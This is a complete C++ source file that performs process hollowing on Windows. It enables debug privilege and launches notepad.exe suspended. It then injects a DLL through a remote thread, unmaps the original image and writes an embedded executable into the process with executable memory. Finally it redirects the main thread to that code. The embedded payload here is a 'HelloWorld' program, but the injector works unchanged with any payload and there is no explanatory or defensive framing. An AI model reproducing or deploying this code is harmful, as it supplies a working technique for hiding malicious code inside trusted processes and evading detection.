#include <windows.h>
#include <iostream>
#include <winternl.h>             // For PROCESS_BASIC_INFORMATION and NtQueryInformationProcess
#include <memoryapi.h>            // For VirtualAllocEx
#include "../bin/HelloWorldHex.h" // Include the hex array for HelloWorld.exe

// Definitions for NtQueryInformationProcess and NtUnmapViewOfSection
typedef NTSTATUS(WINAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(WINAPI *pfnNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "Failed to open process token. Error: " << GetLastError() << "\n";
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
        std::cerr << "Failed to lookup privilege value. Error: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return false;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS) {
        std::cerr << "Failed to adjust token privileges. Error: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

bool LoadRemoteLibrary(HANDLE hProcess, const char *dllPath) {
    void *remotePath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remotePath) {
        std::cerr << "Failed to allocate memory for DLL path. Error: " << GetLastError() << "\n";
        return false;
    }

    if (!WriteProcessMemory(hProcess, remotePath, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "Failed to write DLL path to target process. Error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        return false;
    }

    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr) {
        std::cerr << "Failed to get address of LoadLibraryA. Error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remotePath, 0, NULL);
    if (!hThread) {
        std::cerr << "Failed to create remote thread for LoadLibraryA. Error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);

    return true;
}

PVOID GetRemoteImageBaseAddress(HANDLE hProcess) {
    PROCESS_BASIC_INFORMATION pbi;
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (!hNtDll) {
        std::cerr << "Failed to load ntdll.dll. Error: " << GetLastError() << "\n";
        return nullptr;
    }

    pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        std::cerr << "Failed to retrieve NtQueryInformationProcess. Error: " << GetLastError() << "\n";
        return nullptr;
    }

    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    if (status != 0) {
        std::cerr << "Failed to query process information. NTSTATUS: " << status << "\n";
        return nullptr;
    }

    PVOID remoteImageBaseAddress;
    if (!ReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &remoteImageBaseAddress, sizeof(PVOID), NULL)) {
        std::cerr << "Failed to read ImageBaseAddress from PEB. Error: " << GetLastError() << "\n";
        return nullptr;
    }

    return remoteImageBaseAddress;
}

bool HollowProcess(const char *targetProcess, unsigned char *payload, size_t payloadSize) {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to create target process. Error: " << GetLastError() << "\n";
        return false;
    }

    // Load user32.dll in the target process to ensure it's available for MessageBox
    if (!LoadRemoteLibrary(pi.hProcess, "user32.dll")) {
        std::cerr << "Failed to load user32.dll in the target process.\n";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Retrieve the base address from the target process’s PEB
    PVOID remoteBaseAddress = GetRemoteImageBaseAddress(pi.hProcess);
    if (!remoteBaseAddress) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Unmap the existing image from the target process
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    pfnNtUnmapViewOfSection NtUnmapViewOfSection = (pfnNtUnmapViewOfSection)GetProcAddress(hNtDll, "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection || NtUnmapViewOfSection(pi.hProcess, remoteBaseAddress) != 0) {
        std::cerr << "Failed to unmap memory in target process. Error: " << GetLastError() << "\n";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Parse the headers of the payload to get image size and entry point address
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE *)payload + dosHeader->e_lfanew);
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;

    // Allocate memory in the target process for the new image
    PVOID pRemoteImage = VirtualAllocEx(pi.hProcess, remoteBaseAddress, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteImage) {
        std::cerr << "Failed to allocate memory in target process. Error: " << GetLastError() << "\n";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Write the headers to the allocated memory in the target process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, pRemoteImage, payload, ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten)) {
        std::cerr << "Failed to write headers to target process. Error: " << GetLastError() << "\n";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Write each section to the allocated memory in the target process
    DWORD oldProtect;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData == 0)
            continue;

        PVOID sectionAddress = (PVOID)((BYTE *)pRemoteImage + section[i].VirtualAddress);
        PVOID sectionData = (PVOID)((BYTE *)payload + section[i].PointerToRawData);

        // Set the appropriate protection for the section
        DWORD protect = (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
        VirtualProtectEx(pi.hProcess, sectionAddress, section[i].SizeOfRawData, protect, &oldProtect);

        if (!WriteProcessMemory(pi.hProcess, sectionAddress, sectionData, section[i].SizeOfRawData, &bytesWritten)) {
            std::cerr << "Failed to write section to target process. Error: " << GetLastError() << "\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
    }

    // Adjust entry point in the thread context and resume the process
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "Failed to get thread context. Error: " << GetLastError() << "\n";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Set the entry point to the start of the injected payload's entry function
#ifdef _WIN64
    ctx.Rip = (DWORD_PTR)((BYTE *)pRemoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);
#else
    ctx.Eip = (DWORD_PTR)((BYTE *)pRemoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "Failed to set thread context. Error: " << GetLastError() << "\n";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Resume the main thread, which should execute EntryPoint and show the MessageBox
    ResumeThread(pi.hThread);

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "Process hollowing successful.\n";
    return true;
}


int main() {
    if (!EnableDebugPrivilege()) {
        std::cerr << "Failed to enable SeDebugPrivilege.\n";
        return 1;
    }

    if (HollowProcess("C:\\Windows\\System32\\notepad.exe", hello_world_exe, hello_world_exe_len)) {
        std::cout << "Injected HelloWorld into notepad.exe successfully.\n";
    } else {
        std::cerr << "Process hollowing failed.\n";
    }

    return 0;
}
